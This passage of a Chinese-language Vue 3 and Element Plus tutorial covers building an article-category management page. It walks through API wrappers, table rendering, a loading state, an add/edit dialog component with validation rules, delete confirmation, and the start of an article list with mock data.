class="attr">title</span>=<span class="string">"文章分类"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">extra</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span> 添加分类 <span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    主体部分</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">page-container</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></tbody></table></figure><ul><li>文章管理测试：</li></ul><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">page-container</span> <span class="attr">title</span>=<span class="string">"文章管理"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">extra</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span>发布文章<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    主体部分</span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">page-container</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="文章分类渲染"><a href="#文章分类渲染" class="headerlink" title="文章分类渲染"></a>文章分类渲染</h2><h3 id="封装API-请求获取表格数据"><a href="#封装API-请求获取表格数据" class="headerlink" title="封装API - 请求获取表格数据"></a>封装API - 请求获取表格数据</h3><ol><li>新建 <code>api/article.js</code> 封装获取频道列表的接口</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">'@/utils/request'</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">artGetChannelsService</span> = (<span class="params"></span>) =&gt; request.<span class="title function_">get</span>(<span class="string">'/my/cate/list'</span>)</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>页面中调用接口，获取数据存储</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> channelList = <span class="title function_">ref</span>([])</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getChannelList</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">artGetChannelsService</span>()</span><br><span class="line">  channelList.<span class="property">value</span> = res.<span class="property">data</span>.<span class="property">data</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="el-table-表格动态渲染"><a href="#el-table-表格动态渲染" class="headerlink" title="el-table 表格动态渲染"></a>el-table 表格动态渲染</h3><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-table :data=<span class="string">"channelList"</span> style=<span class="string">"width: 100%"</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">label</span>=<span class="string">"序号"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">type</span>=<span class="string">"index"</span>&gt;</span> <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">label</span>=<span class="string">"分类名称"</span> <span class="attr">prop</span>=<span class="string">"cate_name"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">label</span>=<span class="string">"分类别名"</span> <span class="attr">prop</span>=<span class="string">"cate_alias"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">label</span>=<span class="string">"操作"</span> <span class="attr">width</span>=<span class="string">"100"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">default</span>=<span class="string">"{ row }"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">:icon</span>=<span class="string">"Edit"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">circle</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">plain</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">type</span>=<span class="string">"primary"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        @<span class="attr">click</span>=<span class="string">"onEditChannel(row)"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      &gt;</span><span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">:icon</span>=<span class="string">"Delete"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">circle</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">plain</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">type</span>=<span class="string">"danger"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        @<span class="attr">click</span>=<span class="string">"onDelChannel(row)"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      &gt;</span><span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">template</span> #<span class="attr">empty</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-empty</span> <span class="attr">description</span>=<span class="string">"没有数据"</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line">&lt;/el-table&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onEditChannel</span> = (<span class="params">row</span>) =&gt; {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(row)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onDelChannel</span> = (<span class="params">row</span>) =&gt; {</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(row)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="el-table-表格-loading-效果"><a href="#el-table-表格-loading-效果" class="headerlink" title="el-table 表格 loading 效果"></a>el-table 表格 loading 效果</h3><ol><li>定义变量，v-loading绑定</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> loading = <span class="title function_">ref</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">&lt;el-table v-loading=<span class="string">"loading"</span>&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>发送请求前开启，请求结束关闭</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">getChannelList</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  loading.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">artGetChannelsService</span>()</span><br><span class="line">  channelList.<span class="property">value</span> = res.<span class="property">data</span>.<span class="property">data</span></span><br><span class="line">  loading.<span class="property">value</span> = <span class="literal">false</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="文章分类添加编辑-element-plus-弹层"><a href="#文章分类添加编辑-element-plus-弹层" class="headerlink" title="文章分类添加编辑 [element-plus 弹层]"></a>文章分类添加编辑 [element-plus 弹层]</h2><h3 id="点击显示弹层"><a href="#点击显示弹层" class="headerlink" title="点击显示弹层"></a>点击显示弹层</h3><ol><li>准备弹层</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> dialogVisible = <span class="title function_">ref</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">&lt;el-dialog v-model=<span class="string">"dialogVisible"</span> title=<span class="string">"添加弹层"</span> width=<span class="string">"30%"</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>我是内容部分<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">template</span> #<span class="attr">footer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"dialog-footer"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">"dialogVisible = false"</span>&gt;</span>取消<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span> 确认 <span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line">&lt;/el-dialog&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>点击事件</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;template #extra&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span> @<span class="attr">click</span>=<span class="string">"onAddChannel"</span>&gt;</span>添加分类<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span>&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onAddChannel</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  dialogVisible.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="封装弹层组件-ChannelEdit"><a href="#封装弹层组件-ChannelEdit" class="headerlink" title="封装弹层组件 ChannelEdit"></a>封装弹层组件 ChannelEdit</h3><p>添加 和 编辑，可以共用一个弹层，所以可以将弹层封装成一个组件</p><p>组件对外暴露一个方法 open,  基于 open 的参数，初始化表单数据，并判断区分是添加 还是 编辑</p><ol><li>open({ })                   =&gt;  添加操作，添加表单初始化无数据</li><li>open({ id: xx,  …  })  =&gt;  编辑操作，编辑表单初始化需回显</li></ol><p>具体实现：</p><ol><li>封装组件 <code>article/components/ChannelEdit.vue</code></li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line"><span class="keyword">import</span> { ref } <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">const</span> dialogVisible = <span class="title function_">ref</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">open</span> = <span class="keyword">async</span> (<span class="params">row</span>) =&gt; {</span><br><span class="line">  dialogVisible.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(row)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_">defineExpose</span>({</span><br><span class="line">  open</span><br><span class="line">})</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">el-dialog</span> <span class="attr">v-model</span>=<span class="string">"dialogVisible"</span> <span class="attr">title</span>=<span class="string">"添加弹层"</span> <span class="attr">width</span>=<span class="string">"30%"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是内容部分<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">footer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"dialog-footer"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-button</span> @<span class="attr">click</span>=<span class="string">"dialogVisible = false"</span>&gt;</span>取消<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span> 确认 <span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-dialog</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>通过 ref 绑定</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> dialog = <span class="title function_">ref</span>()</span><br><span class="line"></span><br><span class="line">&lt;!-- 弹窗 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">channel-edit</span> <span class="attr">ref</span>=<span class="string">"dialog"</span>&gt;</span><span class="tag">&lt;/<span class="name">channel-edit</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>点击调用方法显示弹窗</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onAddChannel</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  dialog.<span class="property">value</span>.<span class="title function_">open</span>({})</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onEditChannel</span> = (<span class="params">row</span>) =&gt; {</span><br><span class="line">  dialog.<span class="property">value</span>.<span class="title function_">open</span>(row)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="准备弹层表单"><a href="#准备弹层表单" class="headerlink" title="准备弹层表单"></a>准备弹层表单</h3><ol><li>准备数据 和 校验规则</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> formModel = <span class="title function_">ref</span>({</span><br><span class="line">  <span class="attr">cate_name</span>: <span class="string">''</span>,</span><br><span class="line">  <span class="attr">cate_alias</span>: <span class="string">''</span></span><br><span class="line">})</span><br><span class="line"><span class="keyword">const</span> rules = {</span><br><span class="line">  <span class="attr">cate_name</span>: [</span><br><span class="line">    { <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">'请输入分类名称'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> },</span><br><span class="line">    {</span><br><span class="line">      <span class="attr">pattern</span>: <span class="regexp">/^\S{1,10}$/</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">'分类名必须是1-10位的非空字符'</span>,</span><br><span class="line">      <span class="attr">trigger</span>: <span class="string">'blur'</span></span><br><span class="line">    }</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">cate_alias</span>: [</span><br><span class="line">    { <span class="attr">required</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">'请输入分类别名'</span>, <span class="attr">trigger</span>: <span class="string">'blur'</span> },</span><br><span class="line">    {</span><br><span class="line">      <span class="attr">pattern</span>: <span class="regexp">/^[a-zA-Z0-9]{1,15}$/</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">'分类别名必须是1-15位的字母数字'</span>,</span><br><span class="line">      <span class="attr">trigger</span>: <span class="string">'blur'</span></span><br><span class="line">    }</span><br><span class="line">  ]</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>准备表单</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-form</span><br><span class="line">  :model=<span class="string">"formModel"</span></span><br><span class="line">  :rules=<span class="string">"rules"</span></span><br><span class="line">  label-width=<span class="string">"100px"</span></span><br><span class="line">  style=<span class="string">"padding-right: 30px"</span></span><br><span class="line">&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"分类名称"</span> <span class="attr">prop</span>=<span class="string">"cate_name"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">v-model</span>=<span class="string">"formModel.cate_name"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">minlength</span>=<span class="string">"1"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">maxlength</span>=<span class="string">"10"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    &gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"分类别名"</span> <span class="attr">prop</span>=<span class="string">"cate_alias"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">v-model</span>=<span class="string">"formModel.cate_alias"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">minlength</span>=<span class="string">"1"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">maxlength</span>=<span class="string">"15"</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    &gt;</span><span class="tag">&lt;/<span class="name">el-input</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line">&lt;/el-form&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>编辑需要回显，表单数据需要初始化</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">open</span> = <span class="keyword">async</span> (<span class="params">row</span>) =&gt; {</span><br><span class="line">  dialogVisible.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">  formModel.<span class="property">value</span> = { ...row }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>基于传过来的表单数据，进行标题控制，有 id 的是编辑</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">:title=<span class="string">"formModel.id ? '编辑分类' : '添加分类'"</span></span><br></pre></td></tr></tbody></table></figure><h3 id="确认提交"><a href="#确认提交" class="headerlink" title="确认提交"></a>确认提交</h3><ol><li><code>api/article.js  </code>  封装请求 API</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 添加文章分类</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">artAddChannelService</span> = (<span class="params">data</span>) =&gt; request.<span class="title function_">post</span>(<span class="string">'/my/cate/add'</span>, data)</span><br><span class="line"><span class="comment">// 编辑文章分类</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">artEditChannelService</span> = (<span class="params">data</span>) =&gt;</span><br><span class="line">  request.<span class="title function_">put</span>(<span class="string">'/my/cate/info'</span>, data)</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>页面中校验，判断，提交请求</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-form ref=<span class="string">"formRef"</span>&gt;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> formRef = <span class="title function_">ref</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onSubmit</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">await</span> formRef.<span class="property">value</span>.<span class="title function_">validate</span>()</span><br><span class="line">  formModel.<span class="property">value</span>.<span class="property">id</span></span><br><span class="line">    ? <span class="keyword">await</span> <span class="title function_">artEditChannelService</span>(formModel.<span class="property">value</span>)</span><br><span class="line">    : <span class="keyword">await</span> <span class="title function_">artAddChannelService</span>(formModel.<span class="property">value</span>)</span><br><span class="line">  <span class="title class_">ElMessage</span>({</span><br><span class="line">    <span class="attr">type</span>: <span class="string">'success'</span>,</span><br><span class="line">    <span class="attr">message</span>: formModel.<span class="property">value</span>.<span class="property">id</span> ? <span class="string">'编辑成功'</span> : <span class="string">'添加成功'</span></span><br><span class="line">  })</span><br><span class="line">  dialogVisible.<span class="property">value</span> = <span class="literal">false</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="3"><li>通知父组件进行回显</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> emit = <span class="title function_">defineEmits</span>([<span class="string">'success'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onSubmit</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; {</span><br><span class="line">  ...</span><br><span class="line">  <span class="title function_">emit</span>(<span class="string">'success'</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>父组件监听 success 事件，进行调用回显</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;channel-edit ref=<span class="string">"dialog"</span> @success=<span class="string">"onSuccess"</span>&gt;&lt;/channel-edit&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">onSuccess</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="title function_">getChannelList</span>()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="文章分类删除"><a href="#文章分类删除" class="headerlink" title="文章分类删除"></a>文章分类删除</h2><ol><li><code>api/article.js</code>封装接口 api</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 删除文章分类</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">artDelChannelService</span> = (<span class="params">id</span>) =&gt;</span><br><span class="line">  request.<span class="title function_">delete</span>(<span class="string">'/my/cate/del'</span>, {</span><br><span class="line">    <span class="attr">params</span>: { id }</span><br><span class="line">  })</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>页面中添加确认框，调用接口进行提示</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onDelChannel</span> = <span class="keyword">async</span> (<span class="params">row</span>) =&gt; {</span><br><span class="line">  <span class="keyword">await</span> <span class="title class_">ElMessageBox</span>.<span class="title function_">confirm</span>(<span class="string">'你确认删除该分类信息吗？'</span>, <span class="string">'温馨提示'</span>, {</span><br><span class="line">    <span class="attr">type</span>: <span class="string">'warning'</span>,</span><br><span class="line">    <span class="attr">confirmButtonText</span>: <span class="string">'确认'</span>,</span><br><span class="line">    <span class="attr">cancelButtonText</span>: <span class="string">'取消'</span></span><br><span class="line">  })</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">artDelChannelService</span>(row.<span class="property">id</span>)</span><br><span class="line">  <span class="title class_">ElMessage</span>({ <span class="attr">type</span>: <span class="string">'success'</span>, <span class="attr">message</span>: <span class="string">'删除成功'</span> })</span><br><span class="line">  <span class="title function_">getChannelList</span>()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="文章管理页面-element-plus-强化"><a href="#文章管理页面-element-plus-强化" class="headerlink" title="文章管理页面 - [element-plus 强化]"></a>文章管理页面 - [element-plus 强化]</h1><h2 id="文章列表渲染"><a href="#文章列表渲染" class="headerlink" title="文章列表渲染"></a>文章列表渲染</h2><h3 id="基本架子搭建"><a href="#基本架子搭建" class="headerlink" title="基本架子搭建"></a>基本架子搭建</h3><ol><li>搜索表单</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-form inline&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"文章分类："</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-select</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"新闻"</span> <span class="attr">value</span>=<span class="string">"111"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"体育"</span> <span class="attr">value</span>=<span class="string">"222"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">el-select</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-form-item</span> <span class="attr">label</span>=<span class="string">"发布状态："</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-select</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"已发布"</span> <span class="attr">value</span>=<span class="string">"已发布"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">el-option</span> <span class="attr">label</span>=<span class="string">"草稿"</span> <span class="attr">value</span>=<span class="string">"草稿"</span>&gt;</span><span class="tag">&lt;/<span class="name">el-option</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">el-select</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">"primary"</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">el-button</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">el-form-item</span>&gt;</span></span></span><br><span class="line">&lt;/el-form&gt;</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>表格准备，模拟假数据渲染</li></ol><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> { <span class="title class_">Delete</span>, <span class="title class_">Edit</span> } <span class="keyword">from</span> <span class="string">'@element-plus/icons-vue'</span></span><br><span class="line"><span class="keyword">import</span> { ref } <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="comment">// 假数据</span></span><br><span class="line"><span class="keyword">const</span> articleList = <span class="title function_">ref</span>([</span><br><span class="line">  {</span><br><span class="line">    <span class="attr">id</span>: <span class="number">5961</span>,</span><br><span class="line">    <span class="attr">title</span>: <span class="string">'新的文章啊'</span>,</span><br><span class="line">    <span class="attr">pub_date</span>: <span class="string">'2022-07-10 14:53:52.604'</span>,</span><br><span class="line">    <span class="attr">state</span>: <span class="string">'已发布'</span>,</span><br><span class="line">    <span class="attr">cate_name</span>: <span class="string">'体育'</span></span><br><span class="line">  },</span><br><span class="line">  {</span><br><span class="line">    <span class="attr">id</span>: <span class="number">5962</span>,</span><br><span class="line">    <span class="attr">title</span>: <span class="string">'新的文章啊'</span>,</span><br><span class="line">    <span class="attr">pub_date</span>: <span class="string">'2022-07-10 14:54:30.904'</span>,</span><br><span class="line">    <span class="attr">state</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">cate_name</span>: <span class="string">'体育'</span></span><br><span class="line">  }</span><br><span class="line">])</span><br></pre></td></tr></tbody></table></figure><figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">&lt;el-table :data=<span class="string">"articleList"</span> style=<span class="string">"width: 100%"</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">el-table-column</span> <span 